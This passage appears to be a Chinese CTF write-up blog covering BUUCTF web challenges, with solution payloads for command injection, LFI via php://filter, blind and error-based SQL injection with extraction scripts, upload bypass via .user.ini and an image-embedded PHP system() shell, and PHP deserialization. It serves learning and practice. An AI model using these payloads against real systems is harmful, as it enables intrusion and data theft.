class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>过滤了空格个flag的关键字   </p><p>answer:<br>命令执行变量拼接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>过滤bash用sh执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>内联执行</p><p>将反引号内命令的输出作为输入执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>可以查看index.php具体的过滤规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;PING <span class="number">1</span> (<span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>php伪协议读取  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>写个脚本看过滤了什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_dict</span><span class="params">()</span>:</span></span><br><span class="line">    dict=[]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"sqldict.txt"</span>,<span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            dict.append(line.strip())</span><br><span class="line">    <span class="keyword">return</span> dict</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_filter</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">    valueFilter=[]</span><br><span class="line">    sqlDict=read_dict()</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> sqlDict:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>: <span class="string">"1"</span> + value</span><br><span class="line">        &#125;</span><br><span class="line">        res=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"SQL Injection Checked."</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            valueFilter.append(value)</span><br><span class="line">            print(<span class="string">"Filter word: "</span>+value)</span><br><span class="line">    print(valueFilter)</span><br><span class="line">sql_filter()</span><br></pre></td></tr></table></figure><p>源码内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$dbpass=<span class="string">'root'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($sql)</span></span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    $blackList = <span class="keyword">array</span>(<span class="string">' '</span>,<span class="string">'||'</span>,<span class="string">'#'</span>,<span class="string">'-'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'+'</span>,<span class="string">'or'</span>,<span class="string">'and'</span>,<span class="string">'`'</span>,<span class="string">'"'</span>,<span class="string">'insert'</span>,<span class="string">'group'</span>,<span class="string">'limit'</span>,<span class="string">'update'</span>,<span class="string">'delete'</span>,<span class="string">'*'</span>,<span class="string">'into'</span>,<span class="string">'union'</span>,<span class="string">'load_file'</span>,<span class="string">'outfile'</span>,<span class="string">'./'</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($blackList <span class="keyword">as</span> $blackitem)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos($sql,$blackitem))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = $_POST[<span class="string">'id'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$db = mysql_connect(<span class="string">"localhost"</span>,$dbuser,$dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$db)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>,$db);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(safe($id))&#123;</span><br><span class="line">    $query = mysql_query(<span class="string">"SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($query)&#123;</span><br><span class="line">        $result = mysql_fetch_array($query);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($result)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $result[<span class="string">'content'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Error Occured When Fetch Result."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump($query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"SQL Injection Checked."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由safe函数可知，限制了一些空格、逻辑连接符、注释符、一些操作的关键字。   </p><p>这里可以用字符串截断函数，把每个字符截断出来。如果当前字符等于某个字符，返回1，否则返回2。</p><p>比如: 截取到了flag中的第一个字符f时，从ascii码表里爆破 ， f =a 返回 2 ， f = f 返回1        </p><p>这里过滤的空格可以用括号代替<br>answer：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://2b245443-7cb2-4333-87d0-6e1d1048262b.node3.buuoj.cn/index.php"</span></span><br><span class="line">    flag=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        left = <span class="number">0x1f</span></span><br><span class="line">        right = <span class="number">0x7f</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid=left+(right-left)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> left==mid:</span><br><span class="line">                flag=flag+chr(left)</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            payload=<span class="string">"if(ascii((mid((select(flag)from(flag)),&#123;&#125;,1)))&lt;&#123;&#125;,1,2)"</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">"id"</span>:payload.format(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line">            res=requests.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                right=mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left=mid</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"&#125;"</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">binary()</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛Exec"><a href="#ACTF2020-新生赛Exec" class="headerlink" title="ACTF2020 新生赛Exec"></a>ACTF2020 新生赛Exec</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| cat &#x2F;flag</span><br></pre></td></tr></table></figure><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="强网杯 2019]高明的黑客"></a>强网杯 2019]高明的黑客</h1><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>黑名单，没有过滤phtml, 检测文件头，以及过滤了php<br><img src="../../images/ctf/buuctf/1.jpg" alt=""></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>过滤了union、select、from、where   </p><p>得到表名b4bsql,geekuser  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa<span class="string">' uniunionon seselectlect 1,(seleselectct group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()),3%23</span></span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b74ce88f-f71f-499f-802f-109c754855d2.node3.buuoj.cn/check.php?username=ad&amp;password=pa<span class="string">' uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frofromm b4bsql),3%23</span></span><br></pre></td></tr></table></figure><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><p>phtml绕过  </p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>index.php.bak备份</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=123</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p><img src="../../images/ctf/buuctf/2.jpg" alt=""></p><h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>综上所述.user.ini的利用条件如下：</p><ul><li>服务器脚本语言为PHP</li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件   </li></ul><p>从这来看.user.ini要比.htaccess的应用范围要广一些，毕竟.htaccess只能用于Apache<br>利用.user.ini进行文件上传，参考自从SUCTF 2019 CheckIn 浅谈.user.ini的利用<br>上传这样的一个ini文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>再上传一个a.jpg文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt;system(<span class="string">'cat /flag'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>题目   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题：<br>读取useless.php文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>echo 刚好以字符串形式调用Flag类，所以直接赋值$file=”flag.php”,最后payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:<span class="string">"Flag"</span>:1:&#123;s:4:<span class="string">"file"</span>;s:8:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>访问robots.txt，发现存在user.php.bak备份<br>user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便注册一个用户，view.php?no=1存在注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=-1/**/union/**/select/**/1,(select/*1*/group_concat(data)/*1*/from/**/users),3,4</span><br></pre></td></tr></table></figure><p>可以发现data字段存放的就是序列化字符串，在使用的时候应该就会调用进行data字段进行反序列化操作</p><p>而且根据报错这里也知道了绝对路劲是/var/www/html/</p><p>构造反序列化POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">"file:///var/www/html/flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$res = <span class="keyword">new</span> UserInfo();</span><br><span class="line"><span class="keyword">echo</span> serialize($res)</span><br></pre></td></tr></table></figure><p>根据之前的注入可知，有回显的是第二位，也就是username字段，data对应应该就是第四个字段为，将反序列化字符串尝试以注入的方式写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select/**/1,2,3,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"mochu";s:3:"age";i:7;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span></span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>用户名输入单引号之后报错，简单测试一下and or这些被过滤掉了<br>使用^异或符号替换and</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,user(),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>等号也被过滤了，等号可以使用like来代替，空格使用()括号来代替<br>获取表名 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema)like%27geek%27),0x7e))^<span class="string">'1</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 